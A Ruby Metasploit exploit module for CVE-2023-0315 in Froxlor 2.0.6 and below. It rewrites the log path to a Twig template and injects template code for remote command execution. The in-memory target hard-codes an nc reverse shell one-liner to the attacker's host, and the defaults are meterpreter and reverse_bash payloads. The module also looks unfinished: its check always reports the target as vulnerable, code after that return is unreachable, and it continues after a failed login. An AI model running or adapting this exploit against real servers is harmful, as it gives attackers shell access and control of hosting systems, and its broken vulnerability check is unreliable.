##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Froxlor Log Path RCE',
        'Description' => %q(
          Froxlor v2.0.6 and below suffer from a bug that allows authenticated users to change the application logs path
          to any directory on the OS level which the user www-data can write without restrictions from the backend which
          leads to writing a malicious Twig template that the application will render. That will lead to achieving a
          remote command execution under the user www-data.
        ),
        'Author'      =>
          [
            'Askar',      # discovery
            'jheysel-r7'  # module
          ],
        'References'  =>
          [
            [ 'URL', 'https://shells.systems/author/askar/'],
            [ 'CVE', '2023-0315']
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'linux',
        'Privileged'     => true,
        'DefaultOptions' =>
          {
            'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
          },
        'Arch'           => [ ARCH_CMD ],
        'Targets' => [
          [
            'Linux ',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'CmdStagerFlavor' => %i[echo printf],
              'Type' => :linux_dropper,
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Unix In-Memory',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_memory,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
         'Stability' => [CRASH_SAFE],
         'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
         },
        'DisclosureDate' => '2023-01-29'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'notpassword'])
      ],
      )
  end

  def login

    #TODO this will follow redirects as is, no good
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php'),
      'keep_cookies' => true,
      'vars_post' => {
        'loginname' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'send' => 'send',
        'dologin' => ''
      }
    )

    if res && (res.code == 302 && res.headers.include?('Location') && res.headers['Location'] == 'admin_index.php')
      true
    else
      false
    end
  end

  def check

    return Exploit::CheckCode::Appears

    return Exploit::CheckCode::Unknown("Failed to authenticated to Froxlor") unless login

    print_good('Successful login')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/admin_index.php'),
      'keep_cookies' => true,
    )

    return Exploit::CheckCode::Unknown("Failed to load /admin_index.php after successful login") unless res&.code == 200

    xml = res.get_xml_document


  end

  def get_csrf_token(url)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, url),
      'keep_cookies' => true,
      )

    print_error("Failed to get csrf token") unless res&.code == 200

    csrf_token = nil
    match = res.body.match(/name="csrf-token" content="(\w+)"/)
    if match
      csrf_token = match[1]
      print_good("CSRF token is : #{csrf_token}")
    else
      fail_with(Failure::Unknown, 'There is no CSRF token in HTTP response.')
    end

    csrf_token

  end

  def change_log_path

    csrf_token = get_csrf_token('/admin_settings.php?page=overview&part=logging')
    new_logfile = '/var/www/html/templates/Froxlor/footer.html.twig'

    mime = Rex::MIME::Message.new
    mime.add_part('0', nil, nil, 'form-data; name="logger_enabled"')
    mime.add_part('1', nil, nil, 'form-data; name="logger_enabled"')
    mime.add_part('2', nil, nil, 'form-data; name="logger_severity"')
    mime.add_part('file', nil, nil, 'form-data; name="logger_logtypes[]"')
    mime.add_part(new_logfile, nil, nil, 'form-data; name="logger_logfile"')
    mime.add_part('0' , nil, nil, 'form-data; name="logger_log_cron"')
    mime.add_part(csrf_token, nil, nil, 'form-data; name="csrf_token"')
    mime.add_part("overview", nil, nil, 'form-data; name="page"')
    mime.add_part('', nil, nil, 'form-data; name="action"')
    mime.add_part('send', nil, nil, 'form-data; name="send"')

    res2 = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, '/admin_settings.php?'),
      'vars_get' => { 'page' => 'overview', 'part' => 'logging'},
      'keep_cookies' => true,
      'ctype'  => "multipart/form-data; boundary=#{mime.bound}",
      'data'   => mime.to_s
    )

    if res2 && res2.code == 200
      if res2.body.include?("The settings have been successfully saved")
        return true
      end
    end

    false

  end

  def execute_command(cmd, _opts = {})
    csrf_token = get_csrf_token('/admin_index.php')

    data = {
      'theme' =>  cmd,
      'csrf_token' => csrf_token,
      'page' => "change_theme",
      'send' => "send",
      'dosave' => "",
    }
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/admin_index.php'),
      'keep_cookies' => true,
      'vars_post' => data
      )

    if res && res.code == 200 && res.headers['Location']
      if res.headers['Location'] == 'admin_index.php'
        print_good('Injected payload sucessfully')
      end
    end

    print_status("triggering payload")
    res2 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/admin_index.php'),
      'keep_cookies' => true,
    )
  end

  def exploit

    print_error("Login failed") unless login
    print_good('Successfully Logged in!')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/admin_index.php'),
      'keep_cookies' => true,
      )

    if change_log_path
      print_good('we ou heur')
      case target['Type']
      when :unix_memory
        execute_command("{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #{datastore['LHOST']} #{datastore['LPORT']} >/tmp/f']|filter('exec')}}")
      when :linux_dropper
        execute_cmdstager
      end
    end
  end


end